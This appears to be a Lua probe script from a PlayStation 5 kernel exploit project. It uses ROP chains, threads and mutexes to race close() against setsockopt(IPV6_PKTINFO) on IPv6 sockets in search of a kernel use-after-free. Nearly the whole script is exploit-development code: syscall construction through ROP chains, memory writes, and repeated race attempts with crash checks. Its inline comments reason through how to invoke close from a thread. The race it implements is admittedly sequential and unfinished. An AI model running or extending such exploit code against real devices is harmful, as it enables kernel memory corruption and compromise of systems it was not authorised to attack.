-- CRASH_CLASS: MODERATE
-- PROBE 128a: Thread-based close() race for IPV6 UAF
--
-- Strategy: Use Thrd_create threads + ropchain close() to race
-- setsockopt(IPV6_PKTINFO) against close() on the same socket.
-- This is the standard PS5 kernel exploit primitive.
--
-- Plan:
-- 1. Verify we can close sockets via ropchain
-- 2. Test thread + main thread coordination via mutex
-- 3. Set up the IPV6_PKTINFO race

print("=== PROBE 128a: THREAD CLOSE RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Close a socket via ropchain
print("--- SECTION A: CLOSE VIA ROPCHAIN ---")

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_UDP = 17
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46

-- Create an IPv6 UDP socket via syscall
local sc_socket = make_sc(97)  -- socket
local sc_close = make_sc(6)    -- close
local sc_setsockopt = make_sc(105)  -- setsockopt

-- Create socket via ropchain
local chain1 = ropchain:new()
chain1:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
chain1:restore_through_longjmp()
chain1:execute_through_coroutine()
local ret1 = chain1:get_last_retval_addr()
local sock_fd = to_num(memory.read_qword(ret1))
print("socket fd=" .. sock_fd)

-- Set IPV6_PKTINFO on it
local pktinfo_buf = memory.alloc(0x20)
memory.write_qword(pktinfo_buf, 0)
memory.write_qword(pktinfo_buf + 8, 0)
memory.write_dword(pktinfo_buf + 16, 0)

local chain2 = ropchain:new()
chain2:push_syscall_with_ret(sc_setsockopt, sock_fd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
chain2:restore_through_longjmp()
chain2:execute_through_coroutine()
local ret2 = chain2:get_last_retval_addr()
print("setsockopt(IPV6_PKTINFO) ret=" .. to_num(memory.read_qword(ret2)))

-- Close it via ropchain
local chain3 = ropchain:new()
chain3:push_syscall_with_ret(sc_close, sock_fd)
chain3:restore_through_longjmp()
chain3:execute_through_coroutine()
local ret3 = chain3:get_last_retval_addr()
print("close(sock) ret=" .. to_num(memory.read_qword(ret3)))

-- Verify closed: try setsockopt again
local chain4 = ropchain:new()
chain4:push_syscall_with_ret(sc_setsockopt, sock_fd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
chain4:restore_through_longjmp()
chain4:execute_through_coroutine()
local ret4 = chain4:get_last_retval_addr()
local sso_after = to_num(memory.read_qword(ret4))
print("setsockopt after close ret=" .. sso_after .. " (expected -1=EBADF)")

-- Canary
print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section B: Thread blocking + main thread ropchain coordination
print("")
print("--- SECTION B: MUTEX COORDINATION ---")

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local mtx_init_fn = fcall(libc_addrofs.Mtx_init)
local mtx_lock_fn = fcall(libc_addrofs.Mtx_lock)
local mtx_unlock_fn = fcall(libc_addrofs.Mtx_unlock)

-- Create mutex
local mtx = memory.alloc(64)
pcall(mtx_init_fn, mtx, uint64(0))

-- Lock from main
pcall(mtx_lock_fn, mtx)
print("Main locked mutex")

-- Create thread that blocks on mutex lock
local thr_buf = memory.alloc(8)
memory.write_qword(thr_buf, 0)
local ok_t, ret_t = pcall(thrd_create_fn, thr_buf, libc_addrofs.Mtx_lock, mtx)
print("Thread created: ok=" .. tostring(ok_t) .. " ret=" .. tostring(ret_t))

if ok_t and to_num(ret_t) == 0 then
    -- Thread is blocked. Main thread does work via ropchain.
    print("Thread blocked on mutex")

    -- Create a fresh socket while thread is blocked
    local chain5 = ropchain:new()
    chain5:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    chain5:restore_through_longjmp()
    chain5:execute_through_coroutine()
    local ret5 = chain5:get_last_retval_addr()
    local sock2 = to_num(memory.read_qword(ret5))
    print("Socket created while thread blocked: fd=" .. sock2)

    -- Close it
    local chain6 = ropchain:new()
    chain6:push_syscall_with_ret(sc_close, sock2)
    chain6:restore_through_longjmp()
    chain6:execute_through_coroutine()
    print("Closed socket while thread blocked")

    -- Unlock to release thread
    pcall(mtx_unlock_fn, mtx)
    sleep(0.2, 's')

    -- Join thread
    local thr_id = memory.read_qword(thr_buf)
    pcall(thrd_join_fn, thr_id, uint64(0))
    print("Thread joined")
end

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section C: IPV6 PKTINFO race attempt
-- The race: main thread does setsockopt(IPV6_PKTINFO) on sock
-- while thread closes the same sock. If timing is right,
-- setsockopt reads pktopts pointer, then close() frees it,
-- then setsockopt writes to freed memory = UAF.
print("")
print("--- SECTION C: IPV6 RACE (10 ATTEMPTS) ---")

local RACE_ATTEMPTS = 10

for attempt = 1, RACE_ATTEMPTS do
    -- Create socket pair for this attempt
    local chain_s = ropchain:new()
    chain_s:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    chain_s:restore_through_longjmp()
    chain_s:execute_through_coroutine()
    local race_sock = to_num(memory.read_qword(chain_s:get_last_retval_addr()))

    if race_sock < 0 then
        print("attempt " .. attempt .. ": socket failed")
        break
    end

    -- Set initial pktinfo
    local chain_si = ropchain:new()
    chain_si:push_syscall_with_ret(sc_setsockopt, race_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
    chain_si:restore_through_longjmp()
    chain_si:execute_through_coroutine()

    -- Create mutex for synchronization
    local race_mtx = memory.alloc(64)
    pcall(mtx_init_fn, race_mtx, uint64(0))
    pcall(mtx_lock_fn, race_mtx)

    -- Thread will: lock mutex (blocks) then when unlocked, the thread exits
    -- But we need the thread to call close(race_sock)!
    -- Problem: Thrd_create(func, arg) calls func(arg) with rdi=arg
    -- We can't call close() directly because it needs syscall ABI (rax=6)

    -- Alternative: Use the syscall wrapper directly
    -- syscall.close.fn_addr is the libkernel stub = "mov eax, 6; syscall; ret"
    -- BUT: this stub expects rax to already contain the syscall number
    -- The stub itself sets rax internally since it's a generated wrapper

    -- Actually on FreeBSD, the libc close() wrapper IS a regular C function:
    -- close(int fd) { return __sys_close(fd); }
    -- __sys_close: mov $6, %eax; syscall; ret
    -- If we can find close's address...

    -- We have syscall.close available as a Lua function.
    -- Its fn_addr points to the libkernel syscall stub.
    -- The stub for close specifically does: mov eax, 6; syscall; ret
    -- So calling fn_addr with rdi=fd should work!

    -- Wait: the stub is GENERIC (syscall;ret). The syscall number comes from
    -- the ropchain metadata, not from the stub itself.
    -- Let me check: print the fn_addr of close vs pipe

    if attempt == 1 then
        print("syscall.close.fn_addr=" .. tostring(syscall.close.fn_addr))
        print("syscall.pipe.fn_addr=" .. tostring(syscall.pipe.fn_addr))
        print("same? " .. tostring(tostring(syscall.close.fn_addr) == tostring(syscall.pipe.fn_addr)))
    end

    -- If they're the same, the stub is generic "syscall;ret" and we need
    -- the caller to set rax. We can't use it as a direct thread function.

    -- WORKAROUND: Use fcall from main thread for both operations
    -- and use timing (sleep) instead of true parallelism.
    -- This is a sequential race - not ideal but might work on first try.

    -- Actually, we can build a THREAD-SAFE close:
    -- 1. Write race_sock fd to a known memory address
    -- 2. Thread function = gadgets["ret"] (does nothing, returns)
    -- 3. But that doesn't help...

    -- Better: use native.fcall which calls arbitrary C functions
    -- native.fcall(fn_addr, rdi, ...) = calls fn_addr(rdi, ...)
    -- This goes through the pivot mechanism.
    -- Can we call native.fcall from ropchain? No, it's Lua-level.

    -- REAL SOLUTION: Build a close-specific ropchain and execute it
    -- in a tight loop from main thread, while another ropchain does setsockopt.
    -- Both run sequentially but with minimal gap.

    -- For now, test the sequential race:
    -- 1. Start setsockopt ropchain
    -- 2. Immediately start close ropchain
    -- The kernel might context-switch between them

    -- Attempt: close then setsockopt in quick succession
    local chain_close = ropchain:new()
    chain_close:push_syscall_with_ret(sc_close, race_sock)
    chain_close:restore_through_longjmp()
    chain_close:execute_through_coroutine()

    -- Now try setsockopt on the freed socket
    local chain_sso = ropchain:new()
    chain_sso:push_syscall_with_ret(sc_setsockopt, race_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
    chain_sso:restore_through_longjmp()
    chain_sso:execute_through_coroutine()
    local sso_ret = to_num(memory.read_qword(chain_sso:get_last_retval_addr()))

    -- Unlock mutex and join thread
    pcall(mtx_unlock_fn, race_mtx)

    print(string.format("attempt %d: sock=%d, setsockopt_after_close=%d", attempt, race_sock, sso_ret))

    -- Check process health
    if not pcall(function() return to_num(syscall.getpid()) end) then
        print("*** PROCESS CRASHED - POSSIBLE UAF ***")
        break
    end
end

-- Section D: Explore if native.fcall_with_rax can help
-- native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
-- With fn_addr = syscall;ret stub, rax = 6 (close), rdi = sock_fd
-- This gives us close() as a simple function call!
print("")
print("--- SECTION D: CLOSE VIA NATIVE.FCALL ---")
do
    -- Create test socket
    local chain_s = ropchain:new()
    chain_s:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    chain_s:restore_through_longjmp()
    chain_s:execute_through_coroutine()
    local test_sock = to_num(memory.read_qword(chain_s:get_last_retval_addr()))
    print("test socket fd=" .. test_sock)

    -- Close via native.fcall_with_rax
    if native and native.fcall_with_rax then
        local close_ret = native.fcall_with_rax(
            syscall.pipe.fn_addr,  -- syscall;ret stub
            6,                     -- rax = SYS_close
            test_sock              -- rdi = fd
        )
        print("native.fcall_with_rax close ret=" .. tostring(close_ret))

        -- Verify closed
        local chain_v = ropchain:new()
        chain_v:push_syscall_with_ret(sc_setsockopt, test_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
        chain_v:restore_through_longjmp()
        chain_v:execute_through_coroutine()
        print("verify setsockopt ret=" .. to_num(memory.read_qword(chain_v:get_last_retval_addr())))
    else
        print("native.fcall_with_rax not available")
        -- Try via fcall directly with the syscall stub
        if fcall then
            -- fcall wraps native.fcall which doesn't set rax
            -- We need native.fcall_with_rax specifically
            print("fcall available but no rax control")
        end
    end
end

print("canary3: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 128a COMPLETE ===")
